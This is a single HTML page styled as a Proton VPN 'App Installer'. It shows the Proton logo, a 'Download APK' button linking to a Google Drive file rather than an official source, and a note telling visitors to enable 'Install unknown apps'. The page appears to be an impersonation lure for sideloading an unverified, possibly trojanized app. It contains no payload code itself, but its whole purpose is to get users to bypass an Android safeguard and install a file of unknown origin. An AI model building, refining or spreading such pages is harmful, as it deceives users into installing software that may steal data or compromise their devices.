<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>App Installer</title>

  <style>
    body {
      margin: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background: #0f172a;
      color: #f1f5f9;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .card {
      background: #1e293b;
      padding: 30px;
      border-radius: 20px;
      text-align: center;
      width: 320px;
      box-shadow: 0 10px 30px rgba(0,0,0,0.4);
    }

    .app-icon {
      width: 80px;
      height: 80px;
      margin-bottom: 15px;
    }

    h1 {
      font-size: 20px;
      margin: 10px 0 5px;
    }

    p {
      font-size: 14px;
      color: #94a3b8;
      margin-bottom: 20px;
    }

    .btn {
      display: block;
      width: 100%;
      padding: 14px;
      border: none;
      border-radius: 10px;
      background: #22c55e;
      color: #022c22;
      font-weight: bold;
      font-size: 16px;
      text-decoration: none;
      transition: 0.2s;
    }

    .btn:hover {
      background: #16a34a;
    }

    .note {
      margin-top: 15px;
      font-size: 12px;
      color: #64748b;
    }
  </style>
</head>
<body>

  <div class="card">
    <img class="app-icon" src="https://vpncdn.protonweb.com/image-transformation/?s=c&image=image%2Fupload%2Fv1774890277%2Fstatic%2Flogos%2Ficons%2Fvpn_f9embt.svg" alt="Proton VPN">

    <h1>Proton VPN</h1>
    <p>Secure and private internet access</p>

    <a class="btn" href="https://drive.google.com/uc?export=download&id=1-Xq8T7iB6yual-897yA7G5l0-pHKK2AE">
      Download APK
    </a>

    <div class="note">
      After download, enable "Install unknown apps"
    </div>
  </div>

</body>
</html>
